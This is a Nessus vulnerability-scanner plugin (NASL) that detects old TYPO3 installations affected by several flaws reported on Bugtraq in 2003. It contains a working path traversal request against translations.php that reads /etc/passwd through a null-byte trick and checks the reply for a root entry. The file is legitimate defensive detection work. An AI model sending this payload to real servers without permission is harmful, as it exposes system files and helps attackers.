#
# (C) Tenable Network Security, Inc.
#

# From: Martin Eiszner <martin@websec.org>
# To: bugtraq@securityfocus.com
# Subject: typo3 issues
# Message-Id: <20030228103704.1b657228.martin@websec.org>



include("compat.inc");

if(description)
{
 script_id(11284);
 script_version ("$Revision: 1.13 $");
 script_bugtraq_id(6982, 6983, 6984, 6985, 6986, 6988, 6993);
 script_xref(name:"OSVDB", value:"54043");
 script_xref(name:"OSVDB", value:"54044");
 script_xref(name:"OSVDB", value:"54045");
 script_xref(name:"OSVDB", value:"54046");
 script_xref(name:"OSVDB", value:"54047");
 script_xref(name:"OSVDB", value:"54048");
 script_xref(name:"OSVDB", value:"54049");
 script_xref(name:"OSVDB", value:"54050");
 
 script_name(english:"TYPO3 < 3.5.0 Multiple Vulnerabilities");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote host has a PHP script that is affected by 
multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running an old version of typo3.

An attacker may use it to read arbitrary files and 
execute arbitrary commands on this host." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Typo3 3.5.0." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C" );


script_end_attributes();

 script_summary(english:"Reads /etc/passwd");
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);

if(!can_host_php(port:port))exit(0,"The remote webserver does not support PHP.");

# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list(cgi_dirs(),  "/typo3", "/testsite/typo3"));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  url = string(dir, "/dev/translations.php?ONLY=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00");
  res = http_send_recv3(method:"GET", item:url, port:port);
  if(isnull(res)) exit(1, "Null response to translations.php request.");
  if(egrep(pattern:".*root:.*:0:[01]:.*", string:res[2]))
  {
    security_hole(port);
    exit(0);
  }
}
